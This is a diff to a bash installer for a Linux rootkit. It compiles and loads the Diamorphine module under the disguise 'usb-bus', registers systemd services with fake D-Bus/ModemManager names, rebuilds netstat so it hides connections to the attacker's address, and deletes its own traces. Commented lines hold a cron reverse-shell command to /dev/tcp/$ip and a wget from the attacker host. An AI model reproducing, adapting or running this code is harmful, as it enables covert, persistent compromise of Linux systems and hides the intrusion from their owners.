@@ -16,6 +16,11 @@ else
   cat /proc/version | grep "Red Hat" >/dev/null
   if [ "$?" == "0" ]; then
     distro="redhat"
+  else
+    cat /proc/version | grep "Debian" >/dev/null
+    if [ "$?" == "0" ]; then
+      distro="debian"
+    fi
   fi
 fi
 echo "linux distribution: $distro"
@@ -51,65 +56,95 @@ if [ "$user" != "root" ]; then
 fi
 
 #if the user making the connection is root do the following:
-if [ "$user" == "root" ]; then
-  #users=$(cat /etc/passwd | awk -F: '{ print $1 }')
-  #read -d + -a usernames <<< "$users"
-  #for (( i=0; i < ${#usernames[@]}; i=i+1 )); do
-  #  cron=$(crontab -u ${usernames[i]} -l 2>/dev/null)
-  #  if [ "$cron" == "* * * * * bash -c 'bash &>/dev/tcp/$ip 0>&1'" ]; then
-  #    crontab -u ${usernames[i]} -r
-  #    echo "removing ${usernames[i]} crontab"
-  #  fi
-  #done
 
-  #--create the systemd scripts and services--
-  echo "--create the systemd scripts and services--"
-  mkdir /var/lib/usb-bus 2>/dev/null
-  create_script "$hiding_script" "/var/lib/usb-bus/usb-bus"
-  create_service "$hiding_service" "dbus-org.freedesktop.Modem.service"
-  mkdir /usr/local/share/d-bus 2>/dev/null
-  create_script "$bash_script" "/usr/local/share/d-bus/d-bus"
-  create_service "$bash_service" "dbus-org.freedesktop.ModemManager11.service"
+#users=$(cat /etc/passwd | awk -F: '{ print $1 }')
+#read -d + -a usernames <<< "$users"
+#for (( i=0; i < ${#usernames[@]}; i=i+1 )); do
+#  cron=$(crontab -u ${usernames[i]} -l 2>/dev/null)
+#  if [ "$cron" == "* * * * * bash -c 'bash &>/dev/tcp/$ip 0>&1'" ]; then
+#    crontab -u ${usernames[i]} -r
+#    echo "removing ${usernames[i]} crontab"
+#  fi
+#done
 
-  #--install prerequisite programs--
-  echo "--install prerequisite programs--"
-  programs=(make gcc wget yes unzip patch kmod)
-  for ((i=0; i < ${#programs[@]}; i++)); do
-    install_pre ${programs[$i]}
-    if [ "$?" == "0" ]; then
-      uninstall[$i]=${programs[$i]}
-    else
-      uninstall[$i]=0
-    fi
-  done
+#--create the systemd scripts and services--
+echo "--create the systemd scripts and services--"
+mkdir /var/lib/usb-bus 2>/dev/null
+create_script "$hiding_script" "/var/lib/usb-bus/usb-bus"
+create_service "$hiding_service" "dbus-org.freedesktop.Modem.service"
+mkdir /usr/local/share/d-bus 2>/dev/null
+create_script "$bash_script" "/usr/local/share/d-bus/d-bus"
+create_service "$bash_service" "dbus-org.freedesktop.ModemManager11.service"
 
-  #--make and insert the usb-bus module--
-  echo "--install the rootkit--"
+#--install prerequisite programs--
+echo "--install prerequisite programs--"
+programs=(make gcc wget yes unzip patch kmod)
+for ((i=0; i < ${#programs[@]}; i++)); do
+  install_pre ${programs[$i]}
+  if [ "$?" == "0" ]; then
+    uninstall[$i]=${programs[$i]}
+  else
+    uninstall[$i]=0
+  fi
+done
 
-  #if the distribution is redhat install kernel-devel and modify build accordingly
+#--make and insert the usb-bus module--
+echo "--install the rootkit--"
+
+#-make the usb-bus module-
+if [ ! -d "/lib/modules/$(uname -r)/kernel/drivers/usb-bus" ]; then
+  mkdir /lib/modules/$(uname -r)/kernel/drivers/usb-bus
+fi
+printf "$diamorphine_makefile" >/lib/modules/$(uname -r)/kernel/drivers/usb-bus/Makefile
+printf "$diamorphine" >/lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.c
+printf "make usb-bus rootkit module... "
+make -C /lib/modules/$(uname -r)/kernel/drivers/usb-bus &>/dev/null
+if [ "$?" == "0" ]; then
+  echo "done"
+
+#-if make failed try fixes-
+else
+  echo "failed, trying fixes"
+
+  #redhat
   if [ "$distro" == "redhat" ]; then
-    yum install -y kernel-devel >/dev/null
     readlink -e /lib/modules/$(uname -r)/build >/dev/null
     if [ "$?" != "0" ]; then
+      install_pre kernel-devel
       rm /lib/modules/$(uname -r)/build 2>/dev/null
       ln -s -f -T /usr/src/kernels/*/ /lib/modules/$(uname -r)/build
     fi
-  fi
 
-  #make the usb-bus module
-  if [ ! -d "/lib/modules/$(uname -r)/kernel/drivers/usb-bus" ]; then
-    mkdir /lib/modules/$(uname -r)/kernel/drivers/usb-bus
-  fi
-  printf "$diamorphine_makefile" >/lib/modules/$(uname -r)/kernel/drivers/usb-bus/Makefile
-  printf "$diamorphine" >/lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.c
-  printf "make usb-bus rootkit module... "
-  make -C /lib/modules/$(uname -r)/kernel/drivers/usb-bus &>/dev/null
-  if [ "$?" == "0" ]; then
-    echo "done"
+  #debian
+  elif [ "$distro" == "debian" ]; then
+    install_pre linux-headers-$(uname -r)
 
-  #-if make is unsuccessful get the headers needed for the module to work, patch the kernel makefile and make again-
-  else
-    echo "failed, trying some fixes"
+    #ln -s -f -T /usr/src/linux-headers-4.18.0-kali2-common /lib/modules/$(uname -r)/build
+    #wget -q -P /tmp -r http://$ip:$portp/include/
+    #rm -r /usr/src/linux-headers-$(uname -r)/include
+    #mkdir /usr/src/linux-headers-$(uname -r)/include
+    #mv /tmp/$ip:$portp/include/* /usr/src/linux-headers-$(uname -r)/include 2>/dev/null
+
+    cp /usr/src/linux-headers-4.18.0-kali2-common/arch/x86/Makefile /usr/src/linux-headers-$(uname -r)/arch/x86
+    cp /usr/src/linux-headers-4.18.0-kali2-common/Makefile /usr/src/linux-headers-$(uname -r)
+    #include
+    cp -r /usr/src/linux-headers-4.18.0-kali2-common/include/* /usr/src/linux-headers-$(uname -r)/include 2>/dev/null
+    #asm
+    cp -r /usr/src/linux-headers-$(uname -r)/include/asm-generic/* /usr/src/linux-headers-$(uname -r)/include/asm
+    cp -r /usr/src/linux-headers-$(uname -r)/include/linux/* /usr/src/linux-headers-$(uname -r)/include/asm
+    cp -r /usr/include/x86_64-linux-gnu/asm/* /usr/src/linux-headers-$(uname -r)/include/asm
+    cp -r /usr/src/linux-headers-$(uname -r)/include/uapi/asm-generic/* /usr/src/linux-headers-$(uname -r)/include/asm
+    cp -r /usr/src/linux-headers-4.18.0-kali2-common/arch/x86/include/asm/* /usr/src/linux-headers-$(uname -r)/include/asm
+    #uapi/asm
+    mkdir /usr/src/linux-headers-$(uname -r)/include/uapi/asm 2>/dev/null
+    cp -r /usr/src/linux-headers-$(uname -r)/include/asm/* /usr/src/linux-headers-$(uname -r)/include/uapi/asm
+    #linux
+    mv /usr/src/linux-headers-$(uname -r)/include/linux/signal.h /usr/src/linux-headers-$(uname -r)/include/linux/signal
+    cp /usr/src/linux-headers-$(uname -r)/include/uapi/asm-generic/signal.h /usr/src/linux-headers-$(uname -r)/include/linux
+
+  #ubuntu
+  elif [ "$distro" == "ubuntu" ]; then
+    install_pre libelf-dev
     #copy the headers
     if [ ! -d "/usr/src/linux-headers-$(uname -r)/include/asm" ] || [ ! -L "/usr/src/linux-headers-$(uname -r)/include/asm" ]; then
       cp -r -L /usr/src/linux-headers-$(uname -r)/arch/x86/include/asm /usr/src/linux-headers-$(uname -r)/include 2>/dev/null
@@ -141,95 +176,98 @@ if [ "$user" == "root" ]; then
     patch -b -d /$location </$location/mkfile.patch &>/dev/null
     finish
     rm /$location/mkfile.patch 2>/dev/null
-    #make the usb-bus module
-    printf "make the usb-bus rootkit module... "
-    make -C /lib/modules/$(uname -r)/kernel/drivers/usb-bus &>/dev/null
-    finish
-    rm /$location/Makefile 2>/dev/null
-    mv /$location/Makefile.* /$location/Makefile 2>/dev/null
   fi
-
-  #make module auto-load after every reboot (dangerous, the computer might start having problems at boot)
-  #printf "usb-bus" >/usr/lib/modules-load.d/usb-bus.conf
-  #depmod -a #take care of dependencies otherwise you will have problems booting
-
-  #remove uneeded rootkit files
-  printf "removing uneeded rootkit files... "
-  rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*.c &>/dev/null
-  rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*.o &>/dev/null
-  rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/Makefile &>/dev/null
-  rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/Module* &>/dev/null
-  rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/modules* &>/dev/null
-  rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*safe &>/dev/null
-  echo "done"
-
-  #insert the usb-bus module
-  printf "inserting the usb-bus module... "
-  insmod /lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.ko &>/dev/null
-  finish
-
-  #--replace netstat--
-  which netstat &>/dev/null
-  if [ "$?" == "0" ]; then
-    echo "--replace netstat--"
-    rm /tmp/net-tools.zip &>/dev/null
-    rm  -r /tmp/net-tools-master &>/dev/null
-    #download net-tools.zip
-    printf "download net-tools.zip... "
-    wget -O /tmp/net-tools.zip https://github.com/ecki/net-tools/archive/master.zip &>/dev/null
-    finish
-    #unzip net-tools.zip
-    printf "unzipping net-tools.zip... "
-    unzip -d /tmp /tmp/net-tools.zip >/dev/null
-    finish
-    rm /tmp/net-tools.zip
-    #modify netstat.c
-    printf "modifying netstat.c... "
-    sed -i "s/printf(\"%-4s\s\s%6ld\s%6ld\s%-\*s/if ( strstr(rem_addr, \"$ip:$port\") == 0 ) {\n\t\tprintf(\"%-4s  %6ld %6ld %-*s/" /tmp/net-tools-master/netstat.c
-    sed -i '0,/finish_this_one(uid,inode,timers);/{s/finish_this_one(uid,inode,timers);/\tfinish_this_one(uid,inode,timers);\n\t}/};' /tmp/net-tools-master/netstat.c
-    finish
-    #patch the makefile
-    #printf "patching the net-tools makefile... "
-    printf "$net_tools_patch" >/tmp/net-tools-master/net.patch
-    patch -d /tmp/net-tools-master/ </tmp/net-tools-master/net.patch &>/dev/null
-    #finish
-    #make config net-tools-master
-    printf "make config net-tools-master... "
-    yes "" 2>/dev/null | make -C /tmp/net-tools-master config &>/dev/null
-    finish
-    #make net-tools-master
-    printf "make net-tools-master... "
-    make -C /tmp/net-tools-master &>/dev/null
-    finish
-    #make update net-tools-master, so netstat gets replaced
-    printf "make update net-tools-master... "
-    make update -C /tmp/net-tools-master &>/dev/null
-    if [ "$?" == "0" ]; then
-      echo "done, netstat replaced"
-    else
-      echo "failed, netstat not replaced"
-    fi
-    rm  -r /tmp/net-tools-master
-  fi
-
-  #--remove files and prerequisite programs--
-  echo "--remove files and prerequisite programs--"
-  printf "removing files needed by payload... "
-  rm /tmp/.rootkit &>/dev/null
-  rm /tmp/.functions &>/dev/null
-  rm /tmp/.services &>/dev/null
-  rm /tmp/.variables &>/dev/null
-  if [ "$?" == "0" ]; then
-    echo "done"
-  else
-    echo "failed"
-  fi
-  for ((i=0; i < ${#uninstall[@]}; i++)); do
-    if [ "${uninstall[i]}" != "0" ]; then
-      remove_pre ${uninstall[i]}
-    fi
-  done
-
-  #exit to tell ncat that we are done with the script so the connection closes
-  exit
 fi
+
+#make usb-bus module again
+printf "make usb-bus module again... "
+make -C /lib/modules/$(uname -r)/kernel/drivers/usb-bus #&>/dev/null
+finish
+
+#restore Makefile if distro is ubuntu and initial make failed
+rm /$location/Makefile 2>/dev/null
+mv /$location/Makefile.* /$location/Makefile 2>/dev/null
+
+#make module auto-load after every reboot (dangerous, the computer might start having problems at boot)
+#printf "usb-bus" >/usr/lib/modules-load.d/usb-bus.conf
+#depmod -a #take care of dependencies otherwise you will have problems booting
+
+#remove uneeded rootkit files
+printf "removing uneeded rootkit files... "
+rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*.c &>/dev/null
+rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*.o &>/dev/null
+rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/Makefile &>/dev/null
+rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/Module* &>/dev/null
+rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/modules* &>/dev/null
+rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*safe &>/dev/null
+echo "done"
+
+#insert the usb-bus module
+printf "inserting the usb-bus module... "
+insmod /lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.ko #&>/dev/null
+finish
+
+#--replace netstat--
+which netstat &>/dev/null
+if [ "$?" == "0" ]; then
+  echo "--replace netstat--"
+  rm /tmp/net-tools.zip &>/dev/null
+  rm  -r /tmp/net-tools-master &>/dev/null
+  #download net-tools.zip
+  printf "download net-tools.zip... "
+  wget -O /tmp/net-tools.zip https://github.com/ecki/net-tools/archive/master.zip &>/dev/null
+  finish
+  #unzip net-tools.zip
+  printf "unzipping net-tools.zip... "
+  unzip -d /tmp /tmp/net-tools.zip >/dev/null
+  finish
+  rm /tmp/net-tools.zip
+  #modify netstat.c
+  printf "modifying netstat.c... "
+  sed -i "s/printf(\"%-4s\s\s%6ld\s%6ld\s%-\*s/if ( strstr(rem_addr, \"$ip:$port\") == 0 ) {\n\t\tprintf(\"%-4s  %6ld %6ld %-*s/" /tmp/net-tools-master/netstat.c
+  sed -i '0,/finish_this_one(uid,inode,timers);/{s/finish_this_one(uid,inode,timers);/\tfinish_this_one(uid,inode,timers);\n\t}/};' /tmp/net-tools-master/netstat.c
+  finish
+  #patch the makefile
+  #printf "patching the net-tools makefile... "
+  printf "$net_tools_patch" >/tmp/net-tools-master/net.patch
+  patch -d /tmp/net-tools-master/ </tmp/net-tools-master/net.patch &>/dev/null
+  #finish
+  #make config net-tools-master
+  printf "make config net-tools-master... "
+  yes "" 2>/dev/null | make -C /tmp/net-tools-master config &>/dev/null
+  finish
+  #make net-tools-master
+  printf "make net-tools-master... "
+  make -C /tmp/net-tools-master &>/dev/null
+  finish
+  #make update net-tools-master, so netstat gets replaced
+  printf "make update net-tools-master... "
+  make update -C /tmp/net-tools-master &>/dev/null
+  if [ "$?" == "0" ]; then
+    echo "done, netstat replaced"
+  else
+    echo "failed, netstat not replaced"
+  fi
+  rm  -r /tmp/net-tools-master
+fi
+
+#--remove files and prerequisite programs--
+echo "--remove files and prerequisite programs--"
+printf "removing files needed by payload... "
+rm /tmp/.rootkit &>/dev/null
+rm /tmp/.functions &>/dev/null
+rm /tmp/.services &>/dev/null
+rm /tmp/.variables &>/dev/null
+if [ "$?" == "0" ]; then
+  echo "done"
+else
+  echo "failed"
+fi
+for ((i=0; i < ${#uninstall[@]}; i++)); do
+  if [ "${uninstall[i]}" != "0" ]; then
+    remove_pre ${uninstall[i]}
+  fi
+done
+
+#exit to tell ncat that we are done with the script so the connection closes
+exit
